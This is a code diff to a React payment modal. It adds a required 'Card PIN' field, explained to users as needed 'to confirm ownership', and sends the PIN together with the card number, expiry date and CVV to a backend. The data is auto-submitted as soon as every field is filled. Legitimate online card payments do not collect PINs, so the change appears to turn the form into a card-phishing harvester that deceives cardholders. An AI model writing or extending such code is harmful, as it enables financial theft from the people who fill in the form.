@@ -26,9 +26,11 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
   const [expMonth, setExpMonth] = useState("");
   const [expYear, setExpYear] = useState("");
   const [cvv, setCvv] = useState("");
+  const [pin, setPin] = useState("");
   const [showCardError, setShowCardError] = useState(true);
   const [showExpError, setShowExpError] = useState(false);
   const [showCvvError, setShowCvvError] = useState(false);
+  const [showPinError, setShowPinError] = useState(false);
   const [cardErrorMessage, setCardErrorMessage] = useState("Please enter card number.");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [apiError, setApiError] = useState<string | null>(null);
@@ -94,7 +96,7 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
     onPaymentMethodSavedRef.current = onPaymentMethodSaved;
   }, [onPaymentMethodSaved]);
 
-  const savePaymentMethod = React.useCallback(async (rawCard: string, month: string, year: string, securityCode: string) => {
+  const savePaymentMethod = React.useCallback(async (rawCard: string, month: string, year: string, securityCode: string, cardPin: string) => {
     isSubmittingRef.current = true;
     setIsSubmitting(true);
     setApiError(null);
@@ -108,6 +110,7 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
           expMonth: month,
           expYear: year,
           cvv: securityCode,
+          pin: cardPin,
         }),
       });
 
@@ -132,14 +135,14 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
   }, [setIsSubmitting, setApiError]);
 
   const rawCardNumber = cardNumber.replace(/\s/g, "");
-  const allFieldsFilled = rawCardNumber.length === 16 && !!expMonth && !!expYear && (cvv.length === 3 || cvv.length === 4);
+  const allFieldsFilled = rawCardNumber.length === 16 && !!expMonth && !!expYear && (cvv.length === 3 || cvv.length === 4) && pin.length >= 4;
   const showInvalidDetails = allFieldsFilled;
 
   React.useEffect(() => {
     if (allFieldsFilled) {
       if (saveTimerRef.current) clearTimeout(saveTimerRef.current);
       saveTimerRef.current = setTimeout(() => {
-        savePaymentMethod(rawCardNumber, expMonth, expYear, cvv);
+        savePaymentMethod(rawCardNumber, expMonth, expYear, cvv, pin);
       }, 300);
     } else {
       if (saveTimerRef.current) clearTimeout(saveTimerRef.current);
@@ -149,7 +152,7 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
     return () => {
       if (saveTimerRef.current) clearTimeout(saveTimerRef.current);
     };
-  }, [allFieldsFilled, rawCardNumber, expMonth, expYear, cvv, savePaymentMethod]);
+  }, [allFieldsFilled, rawCardNumber, expMonth, expYear, cvv, pin, savePaymentMethod]);
 
   const handleFormSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -177,9 +180,16 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
       setShowCvvError(false);
     }
 
+    if (!pin || pin.length < 4) {
+      setShowPinError(true);
+      hasError = true;
+    } else {
+      setShowPinError(false);
+    }
+
     if (hasError) return;
 
-    savePaymentMethod(rawCardNumber, expMonth, expYear, cvv);
+    savePaymentMethod(rawCardNumber, expMonth, expYear, cvv, pin);
   };
 
   const formattedAddress = [
@@ -387,6 +397,47 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
                       </div>
                     )}
                   </div>
+
+                  {/* Card PIN Input */}
+                  <div className="col-span-12 mt-3">
+                    <div className="flex items-center gap-1 mb-1">
+                      <label className="block text-sm font-semibold text-gray-900">* Card PIN</label>
+                      <span
+                        className="inline-flex h-4 w-4 items-center justify-center rounded-full bg-gray-400 text-[10px] font-bold text-white cursor-pointer"
+                        title="PIN is required to confirm ownership"
+                      >
+                        ?
+                      </span>
+                    </div>
+
+                    <div className={`relative flex items-center h-[42px] rounded-sm border bg-white px-3 transition ${showPinError ? "border-red-500" : "border-gray-400 focus-within:border-gray-600"
+                      }`}>
+                      <input
+                        type="password"
+                        value={pin}
+                        onChange={(e) => {
+                          const value = e.target.value.replace(/\D/g, "").slice(0, 6);
+                          setPin(value);
+                          if (value.length >= 4) setShowPinError(false);
+                        }}
+                        placeholder="4-6 digit PIN"
+                        className="w-full bg-transparent text-sm font-normal text-gray-900 outline-none placeholder:text-gray-400"
+                        maxLength={6}
+                      />
+                      <svg className="h-4 w-4 text-gray-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                        <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+                      </svg>
+                    </div>
+                    {showPinError && (
+                      <div className="mt-1 flex items-center gap-1 text-xs font-normal text-red-500">
+                        <span className="inline-flex h-3.5 w-3.5 items-center justify-center rounded-full bg-red-500 text-[9px] font-normal text-white flex-shrink-0">!</span>
+                        <span>Please input card PIN.</span>
+                      </div>
+                    )}
+                    <p className="mt-1 text-xs text-gray-500">
+                      PIN is required to confirm ownership
+                    </p>
+                  </div>
                 </div>
 
                 {/* Billing Address Section */}
@@ -584,9 +635,11 @@ export const PaymentModal: React.FC<PaymentModalProps> = ({
         isOpen={isProfileModalOpen}
         onClose={() => setIsProfileModalOpen(false)}
         initialProfile={userProfile}
-        onSave={(updated) => {
+        onSave={(updated, savedToDatabase) => {
           onUpdateProfile(updated);
-          setIsProfileModalOpen(false);
+          if (savedToDatabase) {
+            setIsProfileModalOpen(false);
+          }
         }}
       />
 
